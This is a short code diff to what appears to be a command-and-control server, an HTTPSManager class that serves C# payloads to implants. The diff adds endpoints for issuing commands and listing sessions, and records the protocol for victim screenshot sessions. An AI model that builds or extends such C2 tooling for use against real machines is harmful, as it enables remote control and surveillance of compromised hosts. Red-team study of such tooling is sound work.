@@ -153,6 +153,9 @@ public class HTTPSManager extends C2Interface{
             String cSharpPayload = CSharpPayloadBuilder.buildPayload(properties.getProperty(Constants.DAEMONPAYLOADCSHARPDIR));
             httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD), new PayloadHandler(cSharpPayload));
             
+            httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMDREST), new CommandHandler(io));
+            httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTGETSESSIONS), new SessionRequestHandler(io));
+            
             httpsServer.setExecutor(null); // creates a default executor
             System.out.println("HTTPS online: " + port);
             httpsServer.start();
@@ -323,7 +326,7 @@ class ScreenshotHandler implements HttpHandler {
         		String sessionUID = hostname+":"+username+":"+protocol;
         		sessionId = io.getSessionId(sessionUID);
         		if(sessionId == null) {
-        			sessionId = io.addSession(sessionUID, username, hostname);
+        			sessionId = io.addSession(sessionUID, username, hostname, protocol);
         		}
         	}
         	
